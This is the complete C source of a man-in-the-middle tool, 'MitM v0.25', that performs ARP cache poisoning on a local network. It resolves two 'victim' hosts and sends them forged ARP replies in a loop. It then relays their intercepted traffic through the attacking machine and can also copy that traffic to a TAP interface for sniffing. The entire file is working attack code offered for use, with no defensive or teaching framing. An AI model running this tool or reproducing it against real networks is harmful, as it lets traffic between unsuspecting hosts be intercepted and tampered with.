/*
 * MitM implementation
 *
 */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <fcntl.h>
#include <time.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/ip.h>
#include <signal.h>
#include <termios.h>
#include "osdep/osdep.h"
#include "mitm.h"

/* Interface used to do the mitm */
unsigned char *ifname;
struct ifreq ifr;

/* Socket raw and its address */
int sock;
struct sockaddr_ll addr;
struct sockaddr_ll addr_replay;

/* The MAC & IP of the attacking machine  */
unsigned char my_mac[6];
unsigned char my_ip[4];

/* The MAC & IP  adresses of the victims */
struct macip victimA;
struct macip victimB;

/* Pseudo-interface used to replay the packets */
bool tunneling;
struct tif* ifreplay;
struct ifreq ifr_replay;

/* Threads */
int mitm_running;
pthread_t sniffer;
pthread_t spooferA;
pthread_t spooferB;
pthread_t statser;

/* Stats */
int mitm_packets;
int mitm_packets_replayed;

struct termios tos_save;

int main(int argc, char *argv[]) {
    int c;
    opterr = 0;
    ifname = NULL;
    tunneling = 0;	

    while ((c = getopt (argc, argv, "ti:")) != -1) {
        switch (c) {
            case 't':
                tunneling = true;
                break;
            case 'i':
                ifname = (unsigned char*)optarg;
                break;
            case '?':
                if (optopt == 'i' || optopt == 't') {
                    fprintf(stderr,"Option -%c require an argument\n",optopt);
                    return 0x1;
                }
                break;
            default:
                printf("?!\n");
                break;
        }	
    }

    if (argc-optind != 2) {
        mitm_usage();
        return EXIT_FAILURE;
    }

    unsigned int tmpIP[4];
    c=sscanf(argv[optind],"%d.%d.%d.%d", &tmpIP[0], &tmpIP[1], &tmpIP[2], &tmpIP[3]);
    for (int i=0; i<4; i++) {
        victimA.ip[i] = (char)tmpIP[i];
    }
    c=sscanf(argv[optind+1],"%d.%d.%d.%d", &tmpIP[0], &tmpIP[1], &tmpIP[2], &tmpIP[3]);
    for (int i=0; i<4; i++) {
        victimB.ip[i] = (char)tmpIP[i];
    }

    if (ifname == NULL) {
        mitm_usage();
        return EXIT_FAILURE;
    }

    if (tunneling) {
        ifreplay = ti_open(NULL);
        if (ifreplay == NULL) {
            fprintf(stderr, "Unable to create the tap interface\n");
            return EXIT_FAILURE;
        }
        printf("Created tap interface %s\n", ti_name(ifreplay));
    }

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (sock < 0) {
        fprintf(stderr, "Error while opening raw socket (are you root?)\n");
        return EXIT_FAILURE;
    }

    snprintf(ifr.ifr_name, 16, "%s", ifname);
    if (tunneling)  {
        snprintf(ifr_replay.ifr_name, 16, "%s", ti_name(ifreplay));
    }

    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "Error: %s no such device\n", ifr.ifr_name);
        return EXIT_FAILURE;
    }

    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_pkttype = PACKET_HOST;
    addr.sll_halen = 0;

    if (tunneling) {
        ioctl(sock, SIOCGIFINDEX, &ifr_replay);
        addr_replay.sll_family = AF_PACKET;
        addr_replay.sll_protocol = htons(ETH_P_ALL);
        addr_replay.sll_ifindex = ifr_replay.ifr_ifindex;
        addr_replay.sll_pkttype = PACKET_HOST;
        addr_replay.sll_halen = 0;
    }

    if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0) {
        fprintf(stderr, "Error: unable to retrieve MAC Adress of %s\n", ifr.ifr_name);
        return 0x1;
    }

    for (int i=0; i<sizeof(my_mac); i++) {
        my_mac[i] = ifr.ifr_hwaddr.sa_data[i];	
    }

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0) {
        fprintf(stderr, "Error: unable to retrieve IP Adress of %s\n", ifr.ifr_name);
        return 0x1;
    }

    for (int i=0; i<sizeof(my_ip); i++) {
        my_ip[i] = ((unsigned char*)&((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr)[i];
    }

    if (!arp_lookup(sock, ifname, victimA.ip, victimA.mac)) {
        fprintf(stderr, "Unable to get hardware address of %d.%d.%d.%d\n",
                victimA.ip[0]&0xFF, victimA.ip[1]&0xFF, victimA.ip[2]&0xFF, victimA.ip[3]&0xFF);
        return EXIT_FAILURE;
    }

    if (!arp_lookup(sock, ifname, victimB.ip, victimB.mac)) {
        fprintf(stderr, "Unable to get hardware address of %d.%d.%d.%d\n",
                victimB.ip[0]&0xFF, victimB.ip[1]&0xFF, victimB.ip[2]&0xFF, victimB.ip[3]&0xFF);
        return EXIT_FAILURE;
    }

    printf("Attacker is at %s\n", mitm_printMAC(my_mac));
    printf("%s is at %s\n", mitm_printIP(victimA.ip), mitm_printMAC(victimA.mac));
    printf("%s is at %s\n", mitm_printIP(victimB.ip), mitm_printMAC(victimB.mac));

    struct termios tos;
    tcgetattr(0, &tos_save);
    tcgetattr(0, &tos);
    tos.c_lflag &= (~ECHO);
    tos.c_lflag &= (~ICANON);
    tcsetattr(0,TCSANOW, &tos);

    mitm_run();

    tcsetattr(0, TCSANOW, &tos_save);

    return EXIT_SUCCESS;
}

unsigned char* mitm_printMAC(unsigned char *mac) {
    sprintf((char*)mitm_MACbuf, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0]&0xFF, mac[1]&0xFF, mac[2]&0xFF, mac[3]&0xFF, mac[4]&0xFF, mac[5]&0xFF);
    return mitm_MACbuf;
}

unsigned char* mitm_printIP(unsigned char *ip) {
    sprintf((char*)mitm_IPbuf,"%d.%d.%d.%d", ip[0]&0xFF, ip[1]&0xFF, ip[2]&0xFF, ip[3]&0xFF);
    return mitm_IPbuf;
}

void mitm_usage() {
    fprintf(stderr, "MitM v0.25 by GregWar\n"
            "Usage: mitm -i interface [-t] ip1 ip2\n"
            "	-i interface: 	specify network interface to use\n"
            "	ip1:		The IP adress of the first victim\n"
            "	ip2:		The IP adress of the second victim\n"
            "	-t:		Create a TAP interface containing the\n"
            "			replayed packets (in order to sniff)\n"
           );
}

int arp_lookup(int s, unsigned char *ifn, unsigned char* ip, unsigned char* mac) {
    struct arpreq ar;
    sprintf(ar.arp_dev,"%s",ifn);
    ((struct sockaddr_in*)&ar.arp_pa)->sin_family=AF_INET;

    for (int i=0; i<4; i++) {
        ((unsigned char*)&(((struct sockaddr_in*)&ar.arp_pa)->sin_addr.s_addr))[i]=ip[i];
    }

    if (ioctl(s, SIOCGARP, &ar)==0) {
        for (int i=0; i<6; i++)	
            mac[i] = ar.arp_ha.sa_data[i];
        return 1;
    } else {
        struct arp_packet pckt;
        int started;

        pckt.eth.proto= htons(ETH_P_ARP);
        pckt.ar_hrd     = htons(ARPHRD_ETHER);  /* ARP Packet for Ethernet support */
        pckt.ar_pro     = htons(ETH_P_IP);      /* ARP Packet for IP Protocol */
        pckt.ar_hln     = 0x6;                  /* Ethernet adresses on 6 bytes */
        pckt.ar_pln     = 0x4;                  /* IP adresses on 4 bytes */
        pckt.ar_op      = htons(ARPOP_REQUEST);   /* ARP Op is a Reply */

        for (int i=0; i<4; i++) {
            pckt.ar_sip[i] = my_ip[i];
            pckt.ar_tip[i] = ip[i];
        }	

        for (int i=0; i<6; i++) {
            pckt.ar_sha[i] = my_mac[i];
            pckt.ar_tha[i] = 0x00;
            pckt.eth.source[i] = my_mac[i];
            pckt.eth.target[i] = 0xff;
        }

        sendto(s,(unsigned char*)&pckt,sizeof(struct arp_packet),0,(struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
        started=time(NULL);

        int n;
        char buffer[0xffff];
        socklen_t sl=sizeof(struct sockaddr_ll);
        struct sockaddr_ll laddr;
        struct arp_packet *ptr;
        fcntl(sock, F_SETFL, O_NONBLOCK);

        while ((time(NULL)-started) < 2) {
            n=recvfrom(sock,buffer, 0xffff, 0, (struct sockaddr*)&laddr,&sl);
            if (n>0 && n>=sizeof(struct arp_packet)) {
                ptr=(struct arp_packet*)buffer;
                if (ptr->eth.proto == htons(ETH_P_ARP)) {
                    if (ptr->ar_op == htons(ARPOP_REPLY)) {
                        if (*((int*)ptr->ar_sip) == *((int*)ip)) {
                            for (int i=0; i<6; i++)
                                mac[i] = ptr->ar_sha[i];
                            return 1;
                        }
                    }
                }
            }
        }

        return 0;
    }
}

void mitm_end(int s) {
    printf("\nShutdowning, please wait\n");
    mitm_running = 0x0;
    tcsetattr(0, TCSANOW, &tos_save);
}

void mitm_run() {
    int AB = 0;
    int BA = 1;
    unsigned char c;
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 100*1000000;
    mitm_packets = 0;
    mitm_packets_replayed = 0;
    mitm_running = 1;
    signal(SIGINT, mitm_end);
    pthread_create(&sniffer, NULL, mitm_sniffer, NULL);
    pthread_create(&spooferA, NULL, mitm_ARP_spoofer, (void*)&AB);
    pthread_create(&spooferB, NULL, mitm_ARP_spoofer, (void*)&BA);

    printf("Monkey is in the middle (Press escape to exit)\n");
    pthread_create(&statser, NULL, mitm_printstats, NULL);
    fcntl(0, F_SETFL, O_NONBLOCK);

    while (mitm_running) {
        c = fgetc(stdin);
        if (c == 27) {
            mitm_end(SIGINT);
            break;
        }
        nanosleep(&ts, NULL);
    }
    pthread_join(spooferA,NULL);
    pthread_join(spooferB,NULL);
    pthread_join(sniffer,NULL);
    printf("Cleaning up ARP tables\n");
    mitm_ARP_cleanup();
}

void *mitm_printstats(void*d) {
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 100*1000000;
    while (mitm_running) {
        printf("\rRead %d packets, %d packets replayed",mitm_packets,mitm_packets_replayed);
        nanosleep(&ts, NULL);
    }
    return NULL;
}

void *mitm_ARP_spoofer(void *d) {
    struct arp_packet pckt;
    int mode = *((int*)d);

    pckt.eth.proto= htons(ETH_P_ARP);
    pckt.ar_hrd = htons(ARPHRD_ETHER);	/* ARP Packet for Ethernet support */
    pckt.ar_pro = htons(ETH_P_IP);	/* ARP Packet for IP Protocol */
    pckt.ar_hln = 6;			/* Ethernet adresses on 6 bytes */
    pckt.ar_pln	= 4;			/* IP adresses on 4 bytes */
    pckt.ar_op	= htons(ARPOP_REPLY);	/* ARP Op is a Reply */

    for (int i=0; i<6; i++) {
        pckt.ar_sha[i] = my_mac[i];
        pckt.eth.source[i] = my_mac[i];
    }
    for (int i=0; i<4; i++)
        if (mode == 0) {
            pckt.ar_sip[i] = victimA.ip[i];
            pckt.ar_tip[i] = victimB.ip[i];
        } else {
            pckt.ar_sip[i] = victimB.ip[i];
            pckt.ar_tip[i] = victimA.ip[i];
        }

    for (int i=0; i<6; i++) {
        if (mode == 0) {
            pckt.ar_tha[i] = victimB.mac[i];
            pckt.eth.target[i] = victimB.mac[i];
        } else {
            pckt.ar_tha[i] = victimA.mac[i];
            pckt.eth.target[i] = victimA.mac[i];
        }
    }

    while (mitm_running) {
        sendto(sock,(unsigned char*)&pckt,sizeof(struct arp_packet),
                0, (struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
        sleep(1);
    }

    return NULL;
}

void mitm_ARP_cleanup() {
    struct arp_packet pckt;
    int mode;

    pckt.eth.proto= htons(ETH_P_ARP);
    pckt.ar_hrd = htons(ARPHRD_ETHER);  /* ARP Packet for Ethernet support */
    pckt.ar_pro = htons(ETH_P_IP);      /* ARP Packet for IP Protocol */
    pckt.ar_hln = 6;                    /* Ethernet adresses on 6 bytes */
    pckt.ar_pln = 4;                    /* IP adresses on 4 bytes */
    pckt.ar_op = htons(ARPOP_REPLY);    /* ARP Op is a Reply */

    for (mode=0; mode<=1; mode++) {
        for (int i=0; i<6; i++) {
            if (mode == 0) {
                pckt.ar_sha[i] = victimA.mac[i];
                pckt.ar_tha[i] = victimB.mac[i];
                pckt.eth.target[i] = victimB.mac[i];
            } else {
                pckt.ar_sha[i] = victimB.mac[i];
                pckt.ar_tha[i] = victimA.mac[i];
                pckt.eth.target[i] = victimA.mac[i];
            }
            pckt.eth.source[i] = my_mac[i];
        }
        for (int i=0; i<4; i++) {
            if (mode == 0) {
                pckt.ar_sip[i] = victimA.ip[i];
                pckt.ar_tip[i] = victimB.ip[i];
            } else {
                pckt.ar_sip[i] = victimB.ip[i];
                pckt.ar_tip[i] = victimA.ip[i];
            }
        }

        sendto(sock,(unsigned char*)&pckt,sizeof(struct arp_packet),
                0, (struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
    }
}


int mitm_is_victim(unsigned char*m) {
    int ok = 1;

    for (int i=0; i<6; i++) {
        if (m[i] != victimA.mac[i]) {
            ok = 0;
        }
    }	
    if (ok) { 
        return 1;
    }

    ok = 2;
    for (int i=0; i<6; i++) {
        if (m[i] != victimB.mac[i]) {
            ok = 0;
        }
    }	
    return ok;
}

int mitm_is_me(unsigned char*m) {
    for (int i=0; i<6; i++) {
        if (my_mac[i] != m[i]) {
            return 0;
        }
    }
    return 1;
}

void *mitm_sniffer(void*d) {
    int n, replay;
    socklen_t sl=sizeof(struct sockaddr_ll);
    struct sockaddr_ll laddr;
    struct eth_header *eth;
    unsigned char buffer[0xffff];
    struct iphdr *iph;
    int vid;
    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec = 1000000;

    fcntl(sock, F_SETFL, O_NONBLOCK);

    while (mitm_running) {	
        n=recvfrom(sock,buffer,0xFFFF,0,(struct sockaddr*)&laddr,&sl);
        replay=0;
        if (n>0) {
            if (n>sizeof(struct eth_header) && laddr.sll_ifindex==addr.sll_ifindex) {
                mitm_packets++;
                eth = (struct eth_header*)buffer;
                if (eth->proto == htons(ETH_P_IP)) {
                    vid=mitm_is_victim(eth->source);
                    if (vid && mitm_is_me(eth->target)) {
                        iph=(struct iphdr *)(buffer+sizeof(struct eth_header));
                        if (iph->daddr != *((int*)my_ip) && vid!=0) {
                            for (int i=0; i<6; i++) {
                                eth->source[i]=my_mac[i];
                            }
                            replay = 1;
                            if (vid == 1) {
                                for (int i=0; i<6; i++) {
                                    eth->target[i] = victimB.mac[i];
                                }
                            } else {
                                for (int i=0; i<6; i++) {
                                    eth->target[i] = victimA.mac[i];
                                }
                            }
                        }
                    }
                }
            }
        }

        if (replay) {
            mitm_packets_replayed++;
            sendto(sock,buffer, n, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll));
            if (tunneling) {
                if (vid == 1) {
                    for (int i=0; i<6; i++) {
                        eth->source[i] = victimA.mac[i];
                    }
                } else {
                    for (int i=0; i<6; i++) {
                        eth->source[i] = victimB.mac[i];
                    }
                }
                ti_write(ifreplay, buffer, n);
            }
        }
        if (n <= 0) {
            nanosleep(&ts, NULL);
        }
    }

    return NULL;
}
